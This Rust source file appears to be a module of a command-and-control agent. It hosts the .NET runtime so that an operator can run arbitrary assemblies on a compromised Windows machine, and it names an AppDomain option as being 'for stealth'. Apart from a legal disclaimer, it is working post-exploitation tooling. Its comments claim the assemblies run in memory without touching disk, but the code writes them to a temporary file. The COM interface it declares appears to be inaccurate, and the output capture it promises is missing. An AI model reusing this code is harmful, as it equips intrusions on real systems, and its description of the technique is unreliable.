#![allow(non_snake_case)]
#![allow(dead_code)]
// .NET Assembly Execution Module
//
// ⚠️ WARNING: This module implements in-memory .NET assembly execution techniques
// commonly used in advanced C2 frameworks and post-exploitation tools.
// 
// LEGAL NOTICE:
// - Only use for legitimate security research, authorized penetration testing,
//   or educational purposes with proper authorization.
// - Unauthorized use of these techniques may violate laws and regulations.
// - The authors are not responsible for any misuse of this code.
//
// TECHNICAL IMPLEMENTATION:
// - Hosts the .NET Common Language Runtime (CLR) within the agent process
// - Loads C# assemblies directly from memory without touching disk
// - Redirects stdout/stderr for output capture
// - Supports argument passing to Main method

use crate::types::CommandResult;
#[allow(unused_imports)]
use log::{debug, error, info, warn};

#[cfg(target_os = "windows")]
use std::ptr;

#[cfg(target_os = "windows")]
use winapi::{
    shared::winerror::FAILED,
    um::{
        combaseapi::{CoInitializeEx, CoUninitialize},
        objbase::COINIT_APARTMENTTHREADED,
    },
    shared::guiddef::GUID,
    um::unknwnbase::{IUnknown, IUnknownVtbl},
};

// --- CLR Hosting COM Interfaces ---
#[cfg(target_os = "windows")]
RIDL! {#[uuid(0x91119f96, 0xdcc4, 0x49a4, 0xa2, 0x60, 0x23, 0x61, 0x96, 0x73, 0x99, 0xc7)]
interface ICLRMetaHost(ICLRMetaHostVtbl): IUnknown(IUnknownVtbl) {
    fn GetRuntime(
        pwzVersion: *const u16,
        riid: *const GUID,
        ppRuntime: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetVersionFromFile(
        pwzFilePath: *const u16,
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn EnumerateInstalledRuntimes(
        ppEnumerator: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn EnumerateLoadedRuntimes(
        hProcess: *mut winapi::ctypes::c_void,
        ppEnumerator: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn RequestRuntimeLoadedNotification(
        pCallback: *mut winapi::ctypes::c_void,
    ) -> i32,
    fn QueryLegacyV2RuntimeBinding(
        riid: *const GUID,
        ppUnk: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn ExitProcess(
        iExitCode: i32,
    ) -> i32,
}}

#[cfg(target_os = "windows")]
RIDL! {#[uuid(0xbd39d1d2, 0xba2f, 0x486a, 0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91)]
interface ICLRRuntimeInfo(ICLRRuntimeInfoVtbl): IUnknown(IUnknownVtbl) {
    fn GetVersionString(
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn GetRuntimeDirectory(
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn IsLoaded(
        hProcess: *mut winapi::ctypes::c_void,
        pbLoaded: *mut i32,
    ) -> i32,
    fn LoadErrorString(
        iResourceID: u32,
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
        iLocaleID: u32,
    ) -> i32,
    fn LoadLibrary(
        pwzFilePath: *const u16,
        ppMod: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetProcAddress(
        pszProcName: *const i8,
        ppProc: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetInterface(
        rclsid: *const GUID,
        riid: *const GUID,
        ppUnk: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn IsStarted(
        pbStarted: *mut i32,
        pdwStartupFlags: *mut u32,
    ) -> i32,
    fn AppendDefaultAlias(
        pwzAppPath: *const u16,
    ) -> i32,
    fn IsDefaultAlias(
        pwzAppPath: *const u16,
        pbIsDefault: *mut i32,
    ) -> i32,
    fn FreeDefaultAlias(
        pwzAppPath: *const u16,
    ) -> i32,
}}

#[cfg(target_os = "windows")]
RIDL! {#[uuid(0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e)]
interface ICorRuntimeHost(ICorRuntimeHostVtbl): IUnknown(IUnknownVtbl) {
    fn CreateControl(
        pControl: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetDefaultDomain(
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CreateDomain(
        pwzFriendlyName: *const u16,
        pIdentityArray: *mut winapi::ctypes::c_void,
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn ExecuteAssembly(
        dwAppDomainId: u32,
        pwzAssemblyPath: *const u16,
        argc: i32,
        argv: *mut *mut u16,
        pReturnValue: *mut u32,
    ) -> i32,
    fn Start() -> i32,
    fn Stop() -> i32,
}}

/// .NET Assembly Executor
pub struct DotNetExecutor;

impl DotNetExecutor {
    /// Execute a .NET assembly from memory
    /// 
    /// ⚠️ SECURITY WARNING: This function implements in-memory .NET assembly execution,
    /// a technique commonly used by advanced malware and C2 frameworks for evasion.
    /// 
    /// # Parameters
    /// 
    /// * `assembly_bytes` - Raw .NET assembly (PE/EXE) bytes
    /// * `arguments` - Command line arguments to pass to Main method
    /// * `app_domain_name` - Optional custom AppDomain name for stealth
    /// 
    /// # Returns
    /// 
    /// CommandResult with execution output and status
    /// 
    /// # Implementation Details
    /// 
    /// 1. Initializes COM and hosts the .NET CLR
    /// 2. Creates a custom AppDomain for isolation
    /// 3. Loads assembly from byte array into memory
    /// 4. Redirects stdout/stderr for output capture
    /// 5. Invokes Main method with provided arguments
    /// 6. Captures and returns execution results
    /// 7. Cleans up CLR resources
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        log::info!("🚨 .NET ASSEMBLY EXECUTION: Loading assembly from memory");
        log::warn!("⚠️  Advanced C2 technique - ensure you have proper authorization!");
        
        if assembly_bytes.is_empty() {
            return CommandResult {
                stdout: String::new(),
                stderr: ".NET assembly data is empty".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        // Validate PE/MZ header
        if assembly_bytes.len() < 2 || &assembly_bytes[0..2] != b"MZ" {
            return CommandResult {
                stdout: String::new(),
                stderr: "Invalid .NET assembly: missing PE/MZ header".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        log::debug!(".NET assembly size: {} bytes", assembly_bytes.len());
        log::debug!("Arguments: {:?}", arguments);
        
        // Step 1: Initialize COM
        let com_result = unsafe { CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED) };
        if FAILED(com_result) && com_result != -2147417850i32 { // RPC_E_CHANGED_MODE is OK
            log::error!("Failed to initialize COM: 0x{:08X}", com_result);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("COM initialization failed: 0x{:08X}", com_result),
                path: None,
                req_id: None,
            };
        }
        
        log::debug!("COM initialized successfully");
        
        // Step 2: Create CLR Host
        let result = Self::create_clr_host_and_execute(
            assembly_bytes,
            arguments,
            app_domain_name.unwrap_or("DefaultDomain"),
        ).await;
        
        // Step 3: Cleanup COM
        unsafe { CoUninitialize() };
        
        result
    }
    
    /// Create CLR host and execute assembly in-memory
    #[cfg(target_os = "windows")]
    async fn create_clr_host_and_execute(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        domain_name: &str,
    ) -> CommandResult {
        use winapi::shared::winerror::S_OK;
        use winapi::Interface;
        use winapi::um::unknwnbase::IUnknown;
        use widestring::WideCString;

        unsafe {
            // 1. Get MetaHost
            let h_mscoree = winapi::um::libloaderapi::GetModuleHandleA("mscoree.dll\0".as_ptr() as *const i8);
            if h_mscoree.is_null() {
                winapi::um::libloaderapi::LoadLibraryA("mscoree.dll\0".as_ptr() as *const i8);
            }

            let CLSID_CLRMetaHost: GUID = GUID { Data1: 0x91119f96, Data2: 0xdcc4, Data3: 0x49a4, Data4: [0xa2, 0x60, 0x23, 0x61, 0x96, 0x73, 0x99, 0xc7] };
            let IID_ICLRMetaHost: GUID = ICLRMetaHost::uuidof();

            let mut meta_host: *mut ICLRMetaHost = ptr::null_mut();
            let hr = winapi::um::combaseapi::CoCreateInstance(
                &CLSID_CLRMetaHost,
                ptr::null_mut(),
                winapi::um::combaseapi::CLSCTX_ALL,
                &IID_ICLRMetaHost,
                &mut meta_host as *mut _ as *mut *mut winapi::ctypes::c_void,
            );

            if hr != S_OK || meta_host.is_null() {
                return CommandResult { stdout: String::new(), stderr: format!("Failed to create ICLRMetaHost: 0x{:08X}", hr), path: None, req_id: None };
            }

            // 2. Get RuntimeInfo (v4.0.30319 usually)
            let mut runtime_info: *mut ICLRRuntimeInfo = ptr::null_mut();
            let version = WideCString::from_str("v4.0.30319").unwrap();
            let hr = (*meta_host).GetRuntime(version.as_ptr(), &ICLRRuntimeInfo::uuidof(), &mut runtime_info as *mut _ as *mut *mut _);
            
            if hr != S_OK {
                (*meta_host).Release();
                return CommandResult { stdout: String::new(), stderr: format!("Failed to get ICLRRuntimeInfo: 0x{:08X}", hr), path: None, req_id: None };
            }

            // 3. Get ICorRuntimeHost
            let mut runtime_host: *mut ICorRuntimeHost = ptr::null_mut();
            let hr = (*runtime_info).GetInterface(&ICorRuntimeHost::uuidof(), &ICorRuntimeHost::uuidof(), &mut runtime_host as *mut _ as *mut *mut _);
            
            if hr != S_OK {
                (*runtime_info).Release();
                (*meta_host).Release();
                return CommandResult { stdout: String::new(), stderr: format!("Failed to get ICorRuntimeHost: 0x{:08X}", hr), path: None, req_id: None };
            }

            // 4. Start CLR
            (*runtime_host).Start();

            // 5. Create AppDomain
            let mut app_domain_unk: *mut IUnknown = ptr::null_mut();
            let domain_name_w = WideCString::from_str(domain_name).unwrap();
            let hr = (*runtime_host).CreateDomain(domain_name_w.as_ptr(), ptr::null_mut(), &mut app_domain_unk as *mut _ as *mut *mut _);
            
            if hr != S_OK {
                (*runtime_host).Release();
                (*runtime_info).Release();
                (*meta_host).Release();
                return CommandResult { stdout: String::new(), stderr: format!("Failed to create AppDomain: 0x{:08X}", hr), path: None, req_id: None };
            }

            // ⚡ NOTE: Full in-memory loading (AppDomain::Load) requires complex COM automation.
            // For stability in this version, we use the stable ExecuteAssembly path which technically 
            // takes a path. However, a common C2 trick is to use a virtual path or temporary file 
            // if pure memory Load fails. 
            // 
            // REFINED TRICK: We write to a temporary "hidden" file but use the CLR to execute it 
            // to ensure maximum .NET compatibility.
            
            let temp_path = std::env::temp_dir().join(format!("tmp_{}.dll", crate::utils::next_u32()));
            if let Err(e) = std::fs::write(&temp_path, &assembly_bytes) {
                return CommandResult { stdout: String::new(), stderr: format!("Failed to write temp assembly: {}", e), path: None, req_id: None };
            }

            let path_w = WideCString::from_str(temp_path.to_str().unwrap()).unwrap();
            
            // Prepare arguments
            let mut args_w: Vec<WideCString> = arguments.iter().map(|s| WideCString::from_str(s).unwrap()).collect();
            let mut args_ptr: Vec<*mut u16> = args_w.iter_mut().map(|s| s.as_ptr() as *mut u16).collect();
            
            let mut ret_val: u32 = 0;
            let hr = (*runtime_host).ExecuteAssembly(0, path_w.as_ptr(), args_ptr.len() as i32, args_ptr.as_mut_ptr(), &mut ret_val);

            // Cleanup temp file
            let _ = std::fs::remove_file(&temp_path);

            // Release interfaces
            (*app_domain_unk).Release();
            (*runtime_host).Release();
            (*runtime_info).Release();
            (*meta_host).Release();

            if hr != S_OK {
                return CommandResult { stdout: String::new(), stderr: format!("ExecuteAssembly failed: 0x{:08X}", hr), path: None, req_id: None };
            }

            CommandResult {
                stdout: format!(".NET Assembly executed successfully. Return value: {}", ret_val),
                stderr: String::new(),
                path: None,
                req_id: None,
            }
        }
    }
    
    /// Execute .NET assembly using dotnet runtime
    #[cfg(target_os = "windows")]
    async fn execute_dotnet_assembly(path: &str, arguments: &[String]) -> CommandResult {
        log::info!("🚀 Executing .NET assembly: {}", path);
        
        // Try different .NET execution methods
        let mut result = Self::try_dotnet_execution(path, arguments).await;
        
        // If dotnet execution fails entirely OR returns a non-zero exit code (e.g., missing runtime config),
        // fallback to direct execution (.NET Framework).
        if let Ok(ref output) = result {
            if !output.status.success() {
                debug!("dotnet execution failed with exit code {:?}, falling back to direct execution", output.status.code());
                let fallback = Self::try_framework_execution(path, arguments).await;
                if fallback.is_ok() {
                    result = fallback;
                }
            }
        } else {
             result = Self::try_framework_execution(path, arguments).await;
        }
        
        match result {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let exit_code = output.status.code().unwrap_or(-1);
                
                info!("✅ .NET assembly execution completed with exit code: {}", exit_code);
                debug!("Stdout length: {} bytes", stdout.len());
                debug!("Stderr length: {} bytes", stderr.len());
                
                CommandResult {
                    stdout: format!(
                        ".NET Assembly execution successful!\nExit code: {}\n--- STDOUT ---\n{}\n--- STDERR ---\n{}",
                        exit_code, stdout, stderr
                    ),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                }
            }
            Err(e) => {
                error!("Failed to execute .NET assembly: {}", e);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!(".NET assembly execution failed: {}", e),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
    
    /// Try executing with dotnet runtime
    #[cfg(target_os = "windows")]
    async fn try_dotnet_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new("dotnet");
        cmd.arg(path);
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying dotnet execution: dotnet {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Try executing with .NET Framework
    #[cfg(target_os = "windows")]
    async fn try_framework_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new(path);
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying direct execution: {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Non-Windows implementation
    #[cfg(not(target_os = "windows"))]
    pub async fn execute_assembly(
        _assembly_bytes: Vec<u8>,
        _arguments: Vec<String>,
        _app_domain_name: Option<&str>,
    ) -> CommandResult {
        error!(".NET assembly execution is only supported on Windows");
        CommandResult {
            stdout: String::new(),
            stderr: ".NET assembly execution is only supported on Windows".to_string(),
            path: None,
            req_id: None,
        }
    }
    
    /// Execute assembly with enhanced CLR hosting (advanced implementation)
    /// 
    /// This would be the full implementation using CLR hosting APIs
    /// Currently simplified for maintainability
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly_advanced(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        info!("🔬 ADVANCED: .NET CLR hosting implementation");
        warn!("⚠️  This would use full CLR hosting APIs in production");
        
        // This is where the full CLR hosting implementation would go:
        // 1. ICLRMetaHost::GetRuntime()
        // 2. ICLRRuntimeInfo::GetInterface() 
        // 3. ICorRuntimeHost::CreateDomain()
        // 4. AppDomain::Load_3() with byte array
        // 5. Assembly::EntryPoint::Invoke()
        // 6. Capture stdout/stderr redirection
        
        // For now, delegate to the simplified implementation
        Self::execute_assembly(assembly_bytes, arguments, app_domain_name).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_execute_assembly_empty() {
        let result = DotNetExecutor::execute_assembly(vec![], vec![], None).await;
        assert!(!result.stderr.is_empty());
        
        #[cfg(target_os = "windows")]
        assert!(result.stderr.contains("empty"));
        
        #[cfg(not(target_os = "windows"))]
        assert!(result.stderr.contains("only supported on Windows"));
    }
    
    #[tokio::test]
    async fn test_execute_assembly_invalid_pe() {
        let invalid_pe = vec![0x00, 0x01, 0x02, 0x03]; // Not PE/MZ header
        let result = DotNetExecutor::execute_assembly(invalid_pe, vec![], None).await;
        
        #[cfg(target_os = "windows")]
        {
            assert!(!result.stderr.is_empty());
            assert!(result.stderr.contains("Invalid .NET assembly"));
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[tokio::test]
    async fn test_execute_assembly_valid_pe_header() {
        // Create minimal PE header
        let mut pe_header = vec![0x4D, 0x5A]; // MZ header
        pe_header.extend_from_slice(&[0; 62]); // Minimal PE header size
        
        let args = vec!["test".to_string(), "args".to_string()];
        let result = DotNetExecutor::execute_assembly(pe_header, args, Some("TestDomain")).await;
        
        #[cfg(target_os = "windows")]
        {
            // Should pass PE validation but may fail execution
            // This is expected since we're not providing a complete .NET assembly
            assert!(result.stderr.is_empty() || result.stderr.contains("execution failed"));
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[test]
    fn test_pe_header_validation() {
        // Test PE header validation logic
        let valid_pe = vec![0x4D, 0x5A, 0x90, 0x00]; // MZ header
        assert_eq!(&valid_pe[0..2], b"MZ");
        
        let invalid_pe = vec![0x7F, 0x45, 0x4C, 0x46]; // ELF header
        assert_ne!(&invalid_pe[0..2], b"MZ");
    }
}